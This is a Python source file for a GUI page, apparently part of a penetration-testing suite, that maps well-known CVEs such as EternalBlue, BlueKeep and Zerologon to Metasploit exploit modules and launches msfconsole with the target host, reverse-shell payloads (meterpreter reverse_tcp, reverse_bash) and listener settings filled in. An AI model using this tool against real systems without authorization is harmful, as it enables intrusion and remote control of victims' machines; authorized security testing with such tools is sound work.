"""
Metasploit Bridge — select a target from NetMap/Recon, pick a CVE from CEH,
search for matching Metasploit modules, and launch msfconsole pre-configured
with RHOST set and the module loaded.

Closes the kill chain: recon → vulnerability → exploitation in one tool.

Requires: Metasploit Framework installed (msfconsole in PATH or configured path).
"""
from __future__ import annotations

import json
import pathlib
import re
import subprocess
import threading
from typing import Callable, Optional

import customtkinter as ctk
import tkinter as tk

# ── Palette ───────────────────────────────────────────────────────────────────
_SURFACE = "#161b22"
_BORDER  = "#30363d"
_HI      = "#c9d1d9"
_LO      = "#8b949e"
_GREEN   = "#238636"
_RED     = "#da3633"
_ORANGE  = "#d97706"
_CYAN    = "#58a6ff"

_CFG = pathlib.Path.home() / ".cybersuite" / "config.json"

# Common CVE → Metasploit module mappings
_CVE_MODULE_MAP: dict[str, str] = {
    "CVE-2017-0144": "exploit/windows/smb/ms17_010_eternalblue",
    "CVE-2017-0145": "exploit/windows/smb/ms17_010_psexec",
    "CVE-2019-0708": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
    "CVE-2021-34527": "exploit/windows/local/cve_2021_34527_printnightmare",
    "CVE-2021-44228": "exploit/multi/http/log4shell_header_injection",
    "CVE-2020-1472":  "exploit/windows/dcerpc/cve_2020_1472_zerologon",
    "CVE-2014-6271":  "exploit/multi/http/apache_mod_cgi_bash_env_exec",
    "CVE-2021-3156":  "exploit/linux/local/sudo_baron_samedit",
    "CVE-2022-0847":  "exploit/linux/local/cve_2022_0847_dirtypipe",
}

# ── Helpers ───────────────────────────────────────────────────────────────────

def _active_target() -> str:
    try:
        return json.loads(_CFG.read_text()).get("active_target", "")
    except Exception:
        return ""

def _find_msfconsole() -> Optional[str]:
    for candidate in [
        "msfconsole",
        r"C:\metasploit-framework\bin\msfconsole.bat",
        r"C:\metasploit-framework\bin\msfconsole",
        "/usr/bin/msfconsole",
        "/opt/metasploit-framework/bin/msfconsole",
    ]:
        try:
            r = subprocess.run([candidate, "--version"],
                               capture_output=True, text=True, timeout=5)
            if r.returncode == 0:
                return candidate
        except Exception:
            continue
    return None

def _search_modules(query: str, msf: str,
                    cb: Callable[[str], None]) -> list[str]:
    """Run msfconsole -q -x 'search <query>; exit' and parse output."""
    cb(f"[*] Searching Metasploit modules for: {query}\n")
    try:
        result = subprocess.run(
            [msf, "-q", "-x", f"search {query}; exit"],
            capture_output=True, text=True, timeout=60,
        )
        lines = result.stdout.splitlines()
        modules = []
        for line in lines:
            # Module lines look like: "   0  exploit/windows/smb/...  ..."
            m = re.match(r"\s+\d+\s+(exploit/\S+|auxiliary/\S+|post/\S+)", line)
            if m:
                modules.append(m.group(1))
        return modules
    except Exception as exc:
        cb(f"[ERROR] {exc}\n")
        return []

# ── Page ──────────────────────────────────────────────────────────────────────

class MSFPage(ctk.CTkFrame):

    def __init__(self, master: ctk.CTkFrame, runner,
                 output_cb: Callable[[str], None]) -> None:
        super().__init__(master, fg_color="transparent")
        self._runner  = runner
        self._out     = output_cb
        self._msf:    Optional[str]  = None
        self._modules: list[str]     = []
        self._build()
        # Try to find msfconsole at startup
        threading.Thread(target=self._detect_msf, daemon=True).start()

    def _detect_msf(self) -> None:
        path = _find_msfconsole()
        if path:
            self._msf = path
            self.after(0, lambda: (
                self._msf_status.configure(
                    text=f"✓  msfconsole found: {path}", text_color="#3fb950"),
                self._launch_btn.configure(state="normal"),
                self._search_btn.configure(state="normal"),
            ))
            self._out(f"[+] msfconsole found at: {path}\n")
        else:
            self.after(0, lambda: self._msf_status.configure(
                text="✗  msfconsole not found — install Metasploit Framework",
                text_color=_RED))
            self._out("[!] msfconsole not found. Install from metasploit.com\n")

    # ── Layout ────────────────────────────────────────────────────────────────

    def _build(self) -> None:
        hdr = ctk.CTkFrame(self, fg_color="transparent")
        hdr.pack(fill="x", padx=24, pady=(20, 10))
        ctk.CTkLabel(hdr, text="Metasploit Bridge",
                     font=ctk.CTkFont(size=20, weight="bold")).pack(side="left")
        ctk.CTkLabel(hdr, text="  —  CVE → module → exploit, target pre-filled",
                     text_color=_LO, font=ctk.CTkFont(size=12)).pack(side="left")

        body = ctk.CTkFrame(self, fg_color="transparent")
        body.pack(fill="both", expand=True, padx=24, pady=(0, 16))
        body.grid_columnconfigure(0, weight=1)
        body.grid_columnconfigure(1, weight=1)
        body.grid_rowconfigure(0, weight=1)

        self._build_config_card(body)
        self._build_modules_card(body)

    def _build_config_card(self, parent: ctk.CTkFrame) -> None:
        card = ctk.CTkFrame(parent, fg_color=_SURFACE, corner_radius=8,
                            border_width=1, border_color=_BORDER)
        card.grid(row=0, column=0, sticky="nsew", padx=(0, 8))
        card.grid_columnconfigure(0, weight=1)
        r = 0

        ctk.CTkLabel(card, text="CONFIGURATION",
                     font=ctk.CTkFont(size=10, weight="bold"),
                     text_color=_LO).grid(row=r, column=0, sticky="w",
                                          padx=18, pady=(16, 0))
        r += 1
        ctk.CTkFrame(card, height=1, fg_color=_BORDER).grid(
            row=r, column=0, sticky="ew", padx=18, pady=(6, 14))
        r += 1

        def row_entry(label, var, r):
            ctk.CTkLabel(card, text=label, text_color=_LO,
                         font=ctk.CTkFont(family="Consolas", size=11)
                         ).grid(row=r, column=0, sticky="w", padx=18)
            r += 1
            ctk.CTkEntry(card, textvariable=var,
                         font=ctk.CTkFont(family="Consolas", size=12)
                         ).grid(row=r, column=0, sticky="ew", padx=18, pady=(4, 12))
            return r + 1

        # Target
        self._rhost = ctk.StringVar(value=_active_target())
        r = row_entry("Target IP  (RHOST)", self._rhost, r)

        # Port
        self._rport = ctk.StringVar(value="445")
        r = row_entry("Target Port  (RPORT)", self._rport, r)

        # Payload
        ctk.CTkLabel(card, text="Payload", text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=11)
                     ).grid(row=r, column=0, sticky="w", padx=18)
        r += 1
        self._payload_var = ctk.StringVar(value="windows/x64/meterpreter/reverse_tcp")
        ctk.CTkComboBox(card, variable=self._payload_var,
                        values=[
                            "windows/x64/meterpreter/reverse_tcp",
                            "windows/meterpreter/reverse_tcp",
                            "linux/x86/meterpreter/reverse_tcp",
                            "linux/x64/shell_reverse_tcp",
                            "cmd/unix/reverse_bash",
                            "generic/shell_reverse_tcp",
                        ], font=ctk.CTkFont(family="Consolas", size=11)
                        ).grid(row=r, column=0, sticky="ew", padx=18, pady=(4, 12))
        r += 1

        # LHOST
        self._lhost = ctk.StringVar(value="")
        r = row_entry("Local IP  (LHOST)", self._lhost, r)

        # LPORT
        self._lport = ctk.StringVar(value="4444")
        r = row_entry("Listen Port  (LPORT)", self._lport, r)

        # msfconsole path override
        ctk.CTkLabel(card, text="msfconsole path (optional override)",
                     text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=11)
                     ).grid(row=r, column=0, sticky="w", padx=18)
        r += 1
        self._msf_path_var = ctk.StringVar()
        ctk.CTkEntry(card, textvariable=self._msf_path_var, placeholder_text="auto-detect",
                     font=ctk.CTkFont(family="Consolas", size=11)
                     ).grid(row=r, column=0, sticky="ew", padx=18, pady=(4, 12))
        r += 1

        self._msf_status = ctk.CTkLabel(
            card, text="Detecting msfconsole…",
            text_color=_LO, font=ctk.CTkFont(family="Consolas", size=11),
            wraplength=280)
        self._msf_status.grid(row=r, column=0, sticky="w",
                               padx=18, pady=(0, 16))

    def _build_modules_card(self, parent: ctk.CTkFrame) -> None:
        card = ctk.CTkFrame(parent, fg_color=_SURFACE, corner_radius=8,
                            border_width=1, border_color=_BORDER)
        card.grid(row=0, column=1, sticky="nsew")
        card.grid_columnconfigure(0, weight=1)
        card.grid_rowconfigure(3, weight=1)
        r = 0

        ctk.CTkLabel(card, text="MODULE SELECTION",
                     font=ctk.CTkFont(size=10, weight="bold"),
                     text_color=_LO).grid(row=r, column=0, sticky="w",
                                          padx=18, pady=(16, 0))
        r += 1
        ctk.CTkFrame(card, height=1, fg_color=_BORDER).grid(
            row=r, column=0, sticky="ew", padx=18, pady=(6, 14))
        r += 1

        # Search row
        search_row = ctk.CTkFrame(card, fg_color="transparent")
        search_row.grid(row=r, column=0, sticky="ew", padx=18, pady=(0, 8))
        search_row.grid_columnconfigure(0, weight=1)

        self._search_var = ctk.StringVar()
        ctk.CTkEntry(search_row, textvariable=self._search_var,
                     placeholder_text="CVE-2017-0144 or search term…",
                     font=ctk.CTkFont(family="Consolas", size=12)
                     ).grid(row=0, column=0, sticky="ew", padx=(0, 8))

        self._search_btn = ctk.CTkButton(
            search_row, text="Search", width=80, state="disabled",
            fg_color=_SURFACE, hover_color=_BORDER,
            border_width=1, border_color=_CYAN,
            text_color=_CYAN, font=ctk.CTkFont(size=12),
            command=self._do_search,
        )
        self._search_btn.grid(row=0, column=1)
        r += 1

        # Known CVE quick-picks
        ctk.CTkLabel(card, text="Quick picks (known CVE→module):",
                     text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=10)
                     ).grid(row=r, column=0, sticky="w", padx=18, pady=(0, 4))
        r += 1
        qp = ctk.CTkScrollableFrame(card, fg_color="transparent", height=110)
        qp.grid(row=r, column=0, sticky="ew", padx=12, pady=(0, 8))
        for cve, mod in _CVE_MODULE_MAP.items():
            row_f = ctk.CTkFrame(qp, fg_color="transparent")
            row_f.pack(fill="x", pady=1)
            ctk.CTkLabel(row_f, text=cve, width=130,
                         font=ctk.CTkFont(family="Consolas", size=10),
                         text_color=_ORANGE, anchor="w"
                         ).pack(side="left")
            ctk.CTkLabel(row_f, text=mod,
                         font=ctk.CTkFont(family="Consolas", size=10),
                         text_color=_LO, anchor="w"
                         ).pack(side="left", fill="x", expand=True)
            row_f.bind("<Button-1>", lambda _e, m=mod: self._select_module(m))
            for w in row_f.winfo_children():
                w.bind("<Button-1>", lambda _e, m=mod: self._select_module(m))
        r += 1

        # Search results list
        ctk.CTkLabel(card, text="Search results:",
                     text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=10)
                     ).grid(row=r, column=0, sticky="w", padx=18, pady=(0, 4))
        r += 1
        self._results_frame = ctk.CTkScrollableFrame(
            card, fg_color="transparent")
        self._results_frame.grid(row=r, column=0, sticky="nsew", padx=12, pady=(0, 8))
        r += 1
        card.grid_rowconfigure(r - 1, weight=1)

        # Selected module display
        ctk.CTkFrame(card, height=1, fg_color=_BORDER).grid(
            row=r, column=0, sticky="ew", padx=18, pady=(0, 8))
        r += 1

        sel_row = ctk.CTkFrame(card, fg_color="transparent")
        sel_row.grid(row=r, column=0, sticky="ew", padx=18, pady=(0, 8))
        sel_row.grid_columnconfigure(0, weight=1)
        ctk.CTkLabel(sel_row, text="Selected:",
                     text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=11)
                     ).grid(row=0, column=0, sticky="w")
        self._selected_var = ctk.StringVar(value="(none)")
        ctk.CTkLabel(sel_row, textvariable=self._selected_var,
                     font=ctk.CTkFont(family="Consolas", size=11),
                     text_color=_CYAN, wraplength=300, anchor="w"
                     ).grid(row=1, column=0, sticky="w")
        r += 1

        self._launch_btn = ctk.CTkButton(
            card, text="⚡  Launch in msfconsole",
            fg_color=_RED, hover_color="#b91c1c",
            font=ctk.CTkFont(size=14, weight="bold"),
            height=44, state="disabled",
            command=self._launch,
        )
        self._launch_btn.grid(row=r, column=0, sticky="ew",
                              padx=18, pady=(0, 16))

    def _do_search(self) -> None:
        query = self._search_var.get().strip()
        if not query:
            return
        msf = self._msf_path_var.get().strip() or self._msf
        if not msf:
            self._out("[ERROR] msfconsole not found.\n")
            return

        # Check known CVE map first
        cve_upper = query.upper()
        if cve_upper in _CVE_MODULE_MAP:
            self._select_module(_CVE_MODULE_MAP[cve_upper])
            self._out(f"[+] Known mapping: {cve_upper} → {_CVE_MODULE_MAP[cve_upper]}\n")
            return

        def search() -> None:
            mods = _search_modules(query, msf, self._out)
            self.after(0, lambda m=mods: self._show_results(m))

        threading.Thread(target=search, daemon=True).start()

    def _show_results(self, modules: list[str]) -> None:
        for w in self._results_frame.winfo_children():
            w.destroy()
        if not modules:
            ctk.CTkLabel(self._results_frame,
                         text="No modules found.",
                         text_color=_LO,
                         font=ctk.CTkFont(family="Consolas", size=11)
                         ).pack(pady=8)
            return
        for mod in modules[:30]:
            row = ctk.CTkFrame(self._results_frame, fg_color="transparent")
            row.pack(fill="x", pady=1)
            ctk.CTkLabel(row, text=mod,
                         font=ctk.CTkFont(family="Consolas", size=10),
                         text_color=_HI, anchor="w", cursor="hand2"
                         ).pack(fill="x", padx=4)
            row.bind("<Button-1>", lambda _e, m=mod: self._select_module(m))
            for w in row.winfo_children():
                w.bind("<Button-1>", lambda _e, m=mod: self._select_module(m))

    def _select_module(self, module: str) -> None:
        self._selected_var.set(module)
        self._out(f"[+] Module selected: {module}\n")

    def _launch(self) -> None:
        module = self._selected_var.get()
        if module == "(none)":
            self._out("[ERROR] Select a module first.\n")
            return
        msf = self._msf_path_var.get().strip() or self._msf
        if not msf:
            self._out("[ERROR] msfconsole not found.\n")
            return

        rhost   = self._rhost.get().strip()
        rport   = self._rport.get().strip()
        lhost   = self._lhost.get().strip()
        lport   = self._lport.get().strip()
        payload = self._payload_var.get()

        cmds = [
            f"use {module}",
            f"set RHOST {rhost}" if rhost else "",
            f"set RPORT {rport}" if rport else "",
            f"set PAYLOAD {payload}",
            f"set LHOST {lhost}" if lhost else "",
            f"set LPORT {lport}" if lport else "",
            "show options",
        ]
        rc_script = "; ".join(c for c in cmds if c)

        self._out(f"\n{'='*60}\nLaunching msfconsole\nModule: {module}\n"
                  f"Target: {rhost}:{rport}\n{'='*60}\n")

        try:
            subprocess.Popen(
                [msf, "-q", "-x", rc_script],
                creationflags=subprocess.CREATE_NEW_CONSOLE
                if hasattr(subprocess, "CREATE_NEW_CONSOLE") else 0,
            )
            self._out("[+] msfconsole launched in a new window.\n")
        except Exception as exc:
            self._out(f"[ERROR] {exc}\n")
